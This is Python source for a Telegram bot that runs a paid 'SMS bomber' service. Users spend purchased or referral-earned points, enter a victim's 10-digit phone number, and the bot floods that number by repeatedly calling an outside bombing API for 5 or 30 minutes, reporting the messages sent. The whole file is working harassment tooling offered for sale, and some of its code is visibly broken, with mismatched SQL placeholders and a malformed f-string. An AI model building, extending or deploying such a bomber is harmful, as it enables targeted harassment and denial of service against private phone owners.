import telebot
import datetime
import psycopg2
import psycopg2.errors
from dotenv import load_dotenv
import threading
import requests
import time
import random
import logging
import os

from telebot import types

# ----------------- CONFIGURATION ----------------- #
API_TOKEN = os.environ.get("API_TOKEN")
if not API_TOKEN:
    raise ValueError("No API_TOKEN found in environment variables. Please set the API_TOKEN environment variable.")
ADMIN_IDS = [8060162677, 8279050594]
BASE_URL = os.environ.get("BASE_URL", "https://yahu.site/Mix/index.php?mo={}")
REFERRAL_IMG_URL = "https://occupational-emerald-nhk7av6lrd.edgeone.app/IMG_20250827_181656_131.jpg"
CHANNEL_USERNAME = "@shimuratools"
PAYMENT_USERNAME = "Shimurahu"
SUPPORT_USERNAME = ""
TERMS_AND_CONDITIONS_URL = "https://telegra.ph/Terms-and-Conditions-08-29-4"

# ----------------- LOGGING SETUP ----------------- #
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# ----------------- DATABASE SETUP ----------------- #
# Load environment variables from .env file for local development
load_dotenv()

DATABASE_URL = os.environ.get('DATABASE_URL')
if not DATABASE_URL:
    raise ValueError("No DATABASE_URL found in environment variables. Please set the DATABASE_URL.")

try:
    conn = psycopg2.connect(DATABASE_URL)
    conn.autocommit = True  # Autocommit changes
    logging.info("Database connection successful.")
except psycopg2.OperationalError as e:
    logging.critical(f"Database connection failed: {e}")
    exit()

def initialize_database():
    with conn.cursor() as cur:
        # Create users table
        cur.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id BIGINT PRIMARY KEY,
            name TEXT,
            credit_points INTEGER DEFAULT 5,
            referrer BIGINT,
            daily_uses INTEGER DEFAULT 0,
            last_use_date TEXT,
            last_bonus_date TEXT,
            last_update TEXT,
            premium_points INTEGER DEFAULT 0,
            total_requests INTEGER DEFAULT 0
        )
        """)
        # Create transactions table
        cur.execute("""
        CREATE TABLE IF NOT EXISTS transactions (
            transaction_id SERIAL PRIMARY KEY,
            user_id BIGINT,
            point_type TEXT,
            amount INTEGER,
            timestamp TEXT,
            description TEXT
        )
        """)
        # Add total_requests column if it doesn't exist (for backward compatibility)
        try:
            cur.execute("ALTER TABLE users ADD COLUMN total_requests INTEGER DEFAULT 0")
            logging.info("Column 'total_requests' added to 'users' table.")
        except psycopg2.errors.DuplicateColumn:
            pass # Column already exists
        except Exception as e:
            logging.error(f"Error altering table: {e}")
        
        logging.info("Database initialized.")

initialize_database()

bot = telebot.TeleBot(API_TOKEN)

# --- Thread-safe globals ---
global_request_count = 0
running_flags = {}
user_states = {}

# --- Locks for thread safety ---
request_count_lock = threading.Lock()
running_flags_lock = threading.Lock()
user_states_lock = threading.Lock()


# ==== HELPER FUNCTIONS ==== #

def get_user(user_id):
    cur = conn.cursor()
    cur.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    user_data = cur.fetchone()
    cur.close()
    if not user_data:
        return None
    keys = ["user_id", "name", "credit_points", "referrer", "daily_uses", 
            "last_use_date", "last_bonus_date", "last_update", 
            "premium_points", "total_requests"]
    return dict(zip(keys, user_data))

def add_user(user_id, name, referrer=None):
    if get_user(user_id):
        return
    cur = conn.cursor()
    now = datetime.datetime.now().isoformat()
    cur.execute("INSERT INTO users (user_id, name, credit_points, referrer, last_update) VALUES (?, ?, 5, ?, ?)", (user_id, name, referrer, now))
    conn.commit()
    cur.close()
    if referrer:
        update_points(referrer, 2, 'credit')

def update_points(user_id, amount, point_type):
    column_map = {'credit': 'credit_points', 'premium': 'premium_points'}
    column_name = column_map.get(point_type)
    if not column_name: return
    cur = conn.cursor()
    now = datetime.datetime.now().isoformat()
    query = f"UPDATE users SET {column_name} = {column_name} + ?, last_update = ? WHERE user_id = ?"
    cur.execute(query, (amount, now, user_id))
    conn.commit()
    cur.close()

def log_transaction(user_id, point_type, amount, description):
    cur = conn.cursor()
    now = datetime.datetime.now().isoformat()
    cur.execute("INSERT INTO transactions (user_id, point_type, amount, timestamp, description) VALUES (?, ?, ?, ?, ?)",
                (user_id, point_type, amount, now, description))
    conn.commit()
    cur.close()

def get_deposit_history(user_id, limit=10):
    cur = conn.cursor()
    cur.execute("SELECT point_type, amount, timestamp FROM transactions WHERE user_id=? AND amount > 0 ORDER BY timestamp DESC LIMIT ?", (user_id, limit))
    history = cur.fetchall()
    cur.close()
    return history

def claim_bonus(user_id):
    user = get_user(user_id)
    today_str = datetime.datetime.now().date().isoformat()
    if user is None or user.get('last_bonus_date') == today_str:
        return False
    cur = conn.cursor()
    cur.execute("UPDATE users SET credit_points = credit_points + 2, last_bonus_date=? WHERE user_id=?", (today_str, user_id))
    conn.commit()
    cur.close()
    return True

def get_referral_stats(user_id):
    cur = conn.cursor()
    cur.execute("SELECT COUNT(*) FROM users WHERE referrer=?", (user_id,))
    total_referred = cur.fetchone()[0]
    per_refer = 2
    total_earn = total_referred * per_refer
    cur.close()
    return per_refer, total_referred, total_earn

def get_top_referrers(limit=5):
    cur = conn.cursor()
    cur.execute("""
        SELECT referrer, COUNT(*) AS count FROM users
        WHERE referrer IS NOT NULL
        GROUP BY referrer
        ORDER BY count DESC
        LIMIT ?
    """, (limit,))
    rows = cur.fetchall()
    cur.close()
    return rows

def check_subscription(user_id):
    try:
        member = bot.get_chat_member(f"@{CHANNEL_USERNAME.lstrip('@')}", user_id)
        return member.status in ['member', 'administrator', 'creator']
    except telebot.apihelper.ApiTelegramException as e:
        logging.error(f"Could not check subscription for {user_id}: {e}")
        return False

def create_progress_bar(percentage, length=10):
    filled_length = int(length * percentage // 100)
    bar = '█' * filled_length + '░' * (length - filled_length)
    return f"[{bar}] {percentage:.1f}%"

# ==== VERIFICATION & START FLOW ==== #

@bot.message_handler(commands=['start'])
def start_cmd(message):
    user_id = message.from_user.id
    with user_states_lock:
        user_states[user_id] = {'referrer_args': message.text.split()}
    send_terms_and_conditions(user_id)

def send_terms_and_conditions(chat_id):
    text = (
        "Dear Users,\n"
        "THERE ARE SOME TERMS & CONDITIONS GIVEN PLEASE READ CAREFULLY, "
        "ELSE IF YOU FACE ANY PROBLEM RELATED TO TERMS AND CONDITIONS SO WE CAN'T HELP YOU..."
    )
    markup = types.InlineKeyboardMarkup(row_width=2)
    read_btn = types.InlineKeyboardButton("©️ Read Full T&C", url=TERMS_AND_CONDITIONS_URL)
    accept_btn = types.InlineKeyboardButton("✅ ACCEPT", callback_data='terms_accept')
    decline_btn = types.InlineKeyboardButton("❌ DECLINE", callback_data='terms_decline')
    markup.add(read_btn)
    markup.add(accept_btn, decline_btn)
    bot.send_message(chat_id, text, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data in ['terms_accept', 'terms_decline'])
def handle_terms_response(call):
    bot.delete_message(call.message.chat.id, call.message.message_id)
    if call.data == 'terms_accept':
        prompt_channel_join(call.from_user.id)
    else:
        bot.send_message(call.from_user.id, "You must accept the terms to use the bot.")
        send_terms_and_conditions(call.from_user.id)

def prompt_channel_join(chat_id):
    try:
        first_name = bot.get_chat(chat_id).first_name
    except Exception as e:
        logging.error(f"Could not get user's first name for {chat_id}: {e}")
        first_name = "User" # Fallback name

    text = (
        f"👋 HEY {first_name},
"
        f"☢️ **Note**: *MUST JOIN OUR CHANNEL TO USE THE BOT.*
"
        f"➡️ CLICK ON ✅ **JOINED** AFTER JOINING THE CHANNEL"
    )
    markup = types.InlineKeyboardMarkup(row_width=2)
    channel_btn = types.InlineKeyboardButton("🔥 Join Channel", url=f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}")
    joined_btn = types.InlineKeyboardButton("✅ Joined", callback_data='verify_join')
    markup.add(channel_btn, joined_btn)
    bot.send_message(chat_id, text, parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == 'verify_join')
def handle_verification(call):
    user_id = call.from_user.id
    if check_subscription(user_id):
        bot.answer_callback_query(call.id, "✅ Verification Successful! Welcome.", show_alert=True)
        bot.delete_message(call.message.chat.id, call.message.message_id)
        
        with user_states_lock:
            args = user_states.get(user_id, {}).get('referrer_args', [])
            referrer = None
            if len(args) > 1 and args[1].isdigit() and int(args[1]) != user_id:
                referrer = int(args[1])
            
            add_user(user_id, call.from_user.first_name, referrer)
            if user_id in user_states:
                del user_states[user_id]
        
        show_main_menu(user_id)
    else:
        bot.answer_callback_query(call.id, "❌ You haven't joined the channel yet.", show_alert=True)

# ==== MAIN MENU & HANDLERS ==== #

def show_main_menu(chat_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("🚀 Start SMS Bomber", "👤 Profile", "💰 Buy Premium", "⚡ Referral", "🎁 Daily Bonus", "📊 Status", "☎️ Support")
    bot.send_message(chat_id, "👋 Welcome! You now have full access to the bot. Use the menu below:", reply_markup=markup)

@bot.message_handler(func=lambda msg: msg.text == "👤 Profile")
def profile_handler(message):
    user = get_user(message.chat.id)
    if user:
        profile_text = (
            f"<b>📰 Profile of {user['name']}</b>\n"
            f"🪪 <b>Name</b>: {user['name']}\n"
            f"🆔 <b>User ID</b>: {user['user_id']}\n"
            f"💠 <b>Credit Points</b>: {user['credit_points']}\n"
            f"💎 <b>Premium Points</b>: {user['premium_points']}"
        )
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📜 Deposit History", callback_data='deposit_history'))
        bot.send_message(message.chat.id, profile_text, parse_mode="HTML", reply_markup=markup)

@bot.message_handler(func=lambda msg: msg.text == "⚡ Referral")
def referral_handler(message):
    user_id = message.chat.id
    per_refer, total_referred, total_earn = get_referral_stats(user_id)
    try:
        bot_username = bot.get_me().username
        referral_link = f"https://t.me/{bot_username}?start={user_id}"
    except Exception as e:
        logging.error(f"Could not get bot's username: {e}")
        bot.send_message(user_id, "Could not generate your referral link at the moment. Please try again later.")
        return
    msg_text = (
        "🔥 <b>Refer Your Friends And Earn Exciting Rewards.</b>\n"
        f"🔔 <b>Per Refer:</b> 2 💠\n"
        f"👥 <b>Total Referred:</b> {total_referred}\n"
        f"💰 <b>Total Earn:</b> {total_earn}\n"
        "🚀 <b>Share This Link With Friends:</b>"
    )
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🔗 Share To Friend", url=f"https://t.me/share/url?url={referral_link}&text=🔥Join%20this%20bot%20and%20earn%20credits!"),
        types.InlineKeyboardButton("📋 Copy Link", callback_data='copy_referral_link')
    )
    markup.add(types.InlineKeyboardButton("🏆 My & Top Referrers", callback_data='top_referrers'))
    bot.send_photo(user_id, REFERRAL_IMG_URL, caption=msg_text, reply_markup=markup, parse_mode="HTML")

@bot.message_handler(func=lambda msg: msg.text == "🎁 Daily Bonus")
def bonus_handler(message):
    if claim_bonus(message.chat.id):
        bot.send_message(message.chat.id, "🎉 Congratulations! You have successfully claimed your daily bonus of +2 credits!")
    else:
        bot.send_message(message.chat.id, "⏳ You have already claimed your bonus for today. Please check back tomorrow.")

@bot.message_handler(func=lambda msg: msg.text == "📊 Status")
def status_handler(message):
    user_id = message.chat.id
    
    # Fetch total users and global request count
    total_users = conn.cursor().execute("SELECT COUNT(*) FROM users").fetchone()[0]
    with request_count_lock:
        global_req_count = global_request_count

    if user_id not in ADMIN_IDS:
        # Non-admin view
        bot.send_message(user_id, f"📊 **Bot Status**\n👥 **Total Users**: {total_users}\n📤 **Total Requests Sent**: {global_req_count}", parse_mode="Markdown")
        return

    # Admin view
    cur = conn.cursor()
    cur.execute("SELECT name, total_requests FROM users WHERE total_requests > 0 ORDER BY total_requests DESC LIMIT 10")
    top_users = cur.fetchall()
    cur.close()

    status_text = f"📊 **Admin Bot Status**\n\n"
    status_text += f"👥 **Total Users**: {total_users}\n"
    status_text += f"📤 **Total Global Requests**: {global_req_count}\n\n"
    
    if top_users:
        status_text += "🏆 **Top 10 Users by Requests:**\n"
        for i, (name, requests) in enumerate(top_users, 1):
            status_text += f"{i}. {name}: {requests} requests\n"
    else:
        status_text += "No users have sent any requests yet."
            
    bot.send_message(user_id, status_text, parse_mode="Markdown")

@bot.message_handler(func=lambda msg: msg.text == "☎️ Support")
def support_handler(message):
    text = "☎️ **SUPPORT**\nChoose an Option from the Buttons Below."
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn4 = types.InlineKeyboardButton(f"👨‍💻 Contact Admin", url=f"https://t.me/{SUPPORT_USERNAME}")
    markup.add(btn4)
    bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="Markdown")

@bot.message_handler(func=lambda msg: msg.text == "💰 Buy Premium")
def buy_credits_handler(message):
    text = (
        "💎 **Premium Points**\n"
        "1 Premium Point = 30 minutes of bombing.\n\n"
        "💠 **Credit Points**\n"
        "1 Credit Point = 5 minutes of bombing.\n\n"
        "💲 **Choose your plan:**"
    )
    markup = types.InlineKeyboardMarkup(row_width=1)
    plans = {
        "₹25 - 5 Premium Points (₹5/point)": "buy_premium_5",
        "₹20 - 10 Credit Points (₹2/point)": "buy_credit_10",
    }
    for plan_text, callback_data in plans.items():
        markup.add(types.InlineKeyboardButton(plan_text, callback_data=callback_data))
    markup.add(types.InlineKeyboardButton(f"📞 Contact @{PAYMENT_USERNAME} to Buy", url=f"https://t.me/{PAYMENT_USERNAME}"))
    bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="Markdown")

# ==== CALLBACK HANDLERS ==== #

@bot.callback_query_handler(func=lambda call: call.data == 'deposit_history')
def deposit_history_handler(call):
    user_id = call.from_user.id
    history = get_deposit_history(user_id)
    if not history:
        bot.answer_callback_query(call.id, "No deposit history found.", show_alert=True)
        return

    history_text = "📜 **Your Last 10 Deposits**\n\n"
    point_icons = {'credit': '💠', 'premium': '💎'}
    for p_type, amount, ts in history:
        icon = point_icons.get(p_type, '💰')
        try:
            date_str = datetime.datetime.fromisoformat(ts).strftime('%Y-%m-%d %H:%M')
        except (ValueError, TypeError):
            date_str = "Unknown Date"
        history_text += f"`[{date_str}]`\n{icon} Received `+{amount}` {p_type.capitalize()} Points\n\n"
    
    bot.edit_message_text(history_text, call.message.chat.id, call.message.message_id, parse_mode="Markdown")
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == 'copy_referral_link')
def copy_referral_link_handler(call):
    user_id = call.from_user.id
    referral_link = f"https://t.me/{bot.get_me().username}?start={user_id}"
    try:
        bot.send_message(user_id, f"Tap to copy your referral link:\n\n`{referral_link}`", parse_mode="Markdown")
        bot.answer_callback_query(call.id, "✅ Link sent!")
    except telebot.apihelper.ApiTelegramException as e:
        logging.error(f"Could not send referral link to {user_id}: {e}")
        bot.answer_callback_query(call.id, "❌ Could not send link.")


@bot.callback_query_handler(func=lambda call: call.data.startswith('buy_'))
def handle_buy_plan(call):
    plan_id = call.data
    plan_details = {
        "buy_premium_5": {"name": "5 Premium Points 💎", "price": 25},
        "buy_credit_10": {"name": "10 Credit Points 💠", "price": 20},
    }
    
    plan = plan_details.get(plan_id)
    
    if plan:
        text = (
            f"You have selected the **{plan['name']}** plan for **₹{plan['price']}**.\n\n"
            f"To complete your purchase, please send a payment to @{PAYMENT_USERNAME} on Telegram.\n\n"
            f"After payment, please send a screenshot of the transaction to @{PAYMENT_USERNAME} for confirmation."
        )
        bot.send_message(call.from_user.id, text, parse_mode="Markdown")
        bot.answer_callback_query(call.id, f"Selected: {plan['name']}")
    else:
        bot.answer_callback_query(call.id, "Invalid plan selected.", show_alert=True)


@bot.callback_query_handler(func=lambda call: call.data == 'top_referrers')
def top_referrers_handler(call):
    top_leaders = get_top_referrers()
    if not top_leaders:
        bot.answer_callback_query(call.id, "No referrers found yet.", show_alert=True)
        return
    msg = "🏆 <b>Top Referrers:</b>\n"
    for rank, (referrer_id, count) in enumerate(top_leaders, 1):
        referrer_user = get_user(referrer_id)
        referrer_name = referrer_user['name'] if referrer_user else str(referrer_id)
        msg += f"{rank}. {referrer_name} — {count} referrals\n"
    bot.answer_callback_query(call.id)
    bot.send_message(call.message.chat.id, msg, parse_mode="HTML")

# ==== SMS BOMBER LOGIC ==== #

@bot.message_handler(func=lambda msg: msg.text == "🚀 Start SMS Bomber")
def bomber_handler(message):
    user_id = message.chat.id
    with running_flags_lock:
        if user_id in running_flags:
            bot.send_message(user_id, "⚠️ A bombing process is already running. Use /stop first.")
            return
    
    user = get_user(user_id)
    if not user:
        bot.send_message(user_id, "User not found. Please /start to register.")
        return

    markup = types.InlineKeyboardMarkup()
    options_available = False
    if user['credit_points'] > 0:
        markup.add(types.InlineKeyboardButton("💠 Use 1 Credit Point (5 Mins)", callback_data='use_credit'))
        options_available = True
    if user['premium_points'] > 0:
        markup.add(types.InlineKeyboardButton("💎 Use 1 Premium Point (30 Mins)", callback_data='use_premium'))
        options_available = True
    
    if not options_available:
        bot.send_message(user_id, "❌ You don't have any points to start bombing.")
        return
    bot.send_message(user_id, "👇 Choose which point to use for bombing:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('use_'))
def handle_use_point(call):
    user_id = call.from_user.id
    with running_flags_lock:
        if user_id in running_flags:
            bot.answer_callback_query(call.id, "⚠️ A bombing process is already running. Use /stop first.", show_alert=True)
            return

    point_type = call.data.split('_')[1]
    user = get_user(user_id)
    
    point_key = f'{point_type}_points'
    if not user or user.get(point_key, 0) <= 0:
        bot.answer_callback_query(call.id, "❌ You don't have this point type!", show_alert=True)
        bot.delete_message(call.message.chat.id, call.message.message_id)
        return
        
    bot.delete_message(call.message.chat.id, call.message.message_id)
    msg = bot.send_message(user_id, "📲 Please enter the target number:")
    bot.register_next_step_handler(msg, get_number, point_type)

def get_number(message, point_type):
    user_id = message.chat.id
    number = message.text.strip()
    if not number.isdigit() or len(number) != 10:
        bot.send_message(user_id, "❌ Invalid number! Please enter a 10-digit number.")
        return

    update_points(user_id, -1, point_type)
    log_transaction(user_id, point_type, -1, f"Used 1 {point_type} point")
    bot.send_message(user_id, "⚠️ **Important:** Your point has been deducted. If you stop the bombing mid-way, the point will not be refunded.")

    bomber_thread = threading.Thread(target=start_bomber, args=(user_id, number, point_type), daemon=True)
    with running_flags_lock:
        running_flags[user_id] = {'thread': bomber_thread, 'stop': False, 'type': point_type}
    bomber_thread.start()

def start_bomber(chat_id, number, point_type):
    global global_request_count
    
    is_premium_session = point_type == 'premium'
    duration_seconds = 30 * 60 if is_premium_session else 5 * 60
    
    start_time = time.time()
    end_time = start_time + duration_seconds

    status_msg = bot.send_message(chat_id, f"🚀 Starting Bomber on `{number}`...", parse_mode="Markdown")
    status_msg_id = status_msg.message_id
    
    real_sent_count = 0
    
    failed_count = 0
    last_update_time = time.time()

    stop_requested = False
    while time.time() < end_time and not stop_requested:
        try:
            response = requests.get(BASE_URL.format(number), timeout=30)
            if response.status_code == 200:
                real_sent_count += 1
                with request_count_lock:
                    global_request_count += 1
                cur = conn.cursor()
                cur.execute("UPDATE users SET total_requests = total_requests + 1 WHERE user_id = ?", (chat_id,))
                conn.commit()
                cur.close()
            else:
                failed_count += 1
                logging.warning(f"Bomber API failed with status {response.status_code}: {response.text.strip()}")

        except requests.exceptions.RequestException as e:
            failed_count += 1
            logging.error(f"Bomber API request failed for {number}: {e}")
        except Exception as e:
            failed_count += 1
            logging.error(f"An unexpected error occurred in bomber thread for {number}: {e}")


        if time.time() - last_update_time > 3:
            elapsed_time = time.time() - start_time
            percentage = (elapsed_time / duration_seconds) * 100
            if percentage > 100: percentage = 100
            
            progress_bar = create_progress_bar(percentage)
            remaining_time = int(end_time - time.time())
            
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("⏹️ Stop", callback_data='stop_bombing'))
            new_status_text = (
                f"💣 **Bombing in Progress...**\n"
                f"🎯 **Target:** `{number}`\n"
                f"📈 **Progress:** {progress_bar}\n"
                f"📨 **Requests Sent:** `{real_sent_count}`\n"
                f"⏳ **Time Remaining:** `{remaining_time // 60}:{remaining_time % 60:02d}`"
               )
            try:
                bot.edit_message_text(new_status_text, chat_id, status_msg_id, parse_mode="Markdown", reply_markup=markup)
                last_update_time = time.time()
            except telebot.apihelper.ApiTelegramException:
                pass
        
        with running_flags_lock:
            stop_requested = running_flags.get(chat_id, {}).get('stop', False)
        
        time.sleep(0.2)

    duration = time.time() - start_time
    minutes, seconds = divmod(int(duration), 60)
    duration_text = f"{minutes}m {seconds}s"
    total_attempts = real_sent_count + failed_count
    success_rate = (real_sent_count / total_attempts * 100) if total_attempts > 0 else 0
    
    api_performance_text = f"• API: {real_sent_count} requests, {failed_count} failed\n"
    
    message_count = real_sent_count * 20

    summary_text = (
        f"✅ **Bombing Completed**\n"
        f"📱 Target: `{number}`\n"
        f"⏱ Duration: {duration_text}\n"
        f"📨 Requests Sent: `{real_sent_count}`\n"
        f"💬 Messages Sent (Estimated): `{message_count}`\n"
        f"📈 Success Rate: {success_rate:.2f}%\n"
        f"**API Performance:**\n"
        f"{api_performance_text}"
    )
    try:
        bot.edit_message_text(summary_text, chat_id, status_msg_id, parse_mode="Markdown")
    except telebot.apihelper.ApiTelegramException:
        pass # Ignore if message can't be edited

    with running_flags_lock:
        if chat_id in running_flags:
            del running_flags[chat_id]

@bot.callback_query_handler(func=lambda call: call.data == 'stop_bombing')
def stop_bombing_handler(call):
    user_id = call.from_user.id
    with running_flags_lock:
        if user_id in running_flags:
            running_flags[user_id]['stop'] = True
            bot.answer_callback_query(call.id, "⏹️ Stop command received. Generating final report...")
        else:
            bot.answer_callback_query(call.id, "ℹ️ No bombing process is currently active.", show_alert=True)

@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    user_id = message.chat.id
    with running_flags_lock:
        if user_id in running_flags:
            session_info = running_flags.get(user_id)
            if session_info:
                session_info['stop'] = True
                bot.send_message(user_id, "⏹️ Stop command received. Generating final report...")
        else:
            bot.send_message(user_id, "ℹ️ No bombing process is currently active.")


# ==== ADMIN PANEL ==== #
@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.send_message(message.chat.id, "❌ You are not an admin.")
        return
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("💠 Add Credit Points", callback_data='admin_add_credit'),
        types.InlineKeyboardButton("💎 Add Premium Points", callback_data='admin_add_premium'),
        types.InlineKeyboardButton("📢 Broadcast Message", callback_data='admin_broadcast')
    )
    bot.send_message(message.chat.id, "⚙️ **Admin Panel**", reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == 'admin_broadcast')
def handle_broadcast_callback(call):
    if call.from_user.id not in ADMIN_IDS: return
    msg = bot.send_message(call.message.chat.id, "✍️ Please enter the message you want to broadcast to all users.")
    bot.register_next_step_handler(msg, process_broadcast_message)
    bot.answer_callback_query(call.id)

def process_broadcast_message(message):
    admin_id = message.from_user.id
    broadcast_text = message.text
    bot.send_message(admin_id, "⏳ Starting broadcast... This may take a while.")
    
    threading.Thread(target=send_broadcast, args=(admin_id, broadcast_text), daemon=True).start()

def send_broadcast(admin_id, text):
    cur = conn.cursor()
    cur.execute("SELECT user_id FROM users")
    users = cur.fetchall()
    cur.close()
    
    sent_count = 0
    failed_count = 0
    
    for user in users:
        user_id = user[0]
        try:
            bot.send_message(user_id, text, parse_mode="Markdown")
            sent_count += 1
        except telebot.apihelper.ApiTelegramException as e:
            failed_count += 1
            logging.warning(f"Broadcast failed for user {user_id}: {e}")
        time.sleep(0.1) 
        
    report = f"✅ **Broadcast Finished**\n\nSent to: `{sent_count}` users\nFailed for: `{failed_count}` users"
    bot.send_message(admin_id, report, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_add_'))
def handle_admin_add(call):
    if call.from_user.id not in ADMIN_IDS: return
    point_type = call.data.split('_')[-1]
    prompt_text = {
        'credit': "💠 Enter User ID and Credit Points (e.g., `123456789 10`):",
        'premium': "💎 Enter User ID and Premium Points (e.g., `123456789 5`):"
    }
    msg = bot.send_message(call.message.chat.id, prompt_text.get(point_type, "Invalid selection."), parse_mode="Markdown")
    if point_type in prompt_text:
        bot.register_next_step_handler(msg, process_add_points, point_type)
    bot.answer_callback_query(call.id)

def process_add_points(message, point_type):
    admin_id = message.from_user.id
    try:
        parts = message.text.split()
        user_id, amount = int(parts[0]), int(parts[1])
        if not get_user(user_id):
            bot.send_message(admin_id, f"❌ User with ID `{user_id}` not found.")
            return
        
        update_points(user_id, amount, point_type)
        log_transaction(user_id, point_type, amount, f"Added by admin {admin_id}")

        point_name = {'credit': 'Credit', 'premium': 'Premium'}
        bot.send_message(admin_id, f"✅ Successfully added `{amount}` {point_name[point_type]} Points to user `{user_id}`.")
        bot.send_message(user_id, f"🎉 An admin has granted you **{amount} {point_name[point_type]} Points**!", parse_mode="Markdown")
    except (ValueError, IndexError) as e:
        logging.warning(f"Admin {admin_id} provided invalid input for add_points: {message.text}. Error: {e}")
        bot.send_message(admin_id, "❌ **Error:** Invalid format. Please use `UserID Amount` (e.g., `123456789 10`).")
    except Exception as e:
        logging.error(f"Unexpected error in process_add_points: {e}")
        bot.send_message(admin_id, f"❌ **An unexpected error occurred:** {e}")

if __name__ == "__main__":
    print("Bot is running...")
    while True:
        try:
            bot.infinity_polling(timeout=10, long_polling_timeout=5)
        except KeyboardInterrupt:
            print("\nBot stopped by user.")
            break
        except Exception as e:
            logging.error(f"Infinity polling failed with error: {e}. Restarting in 15 seconds...")
            time.sleep(15)
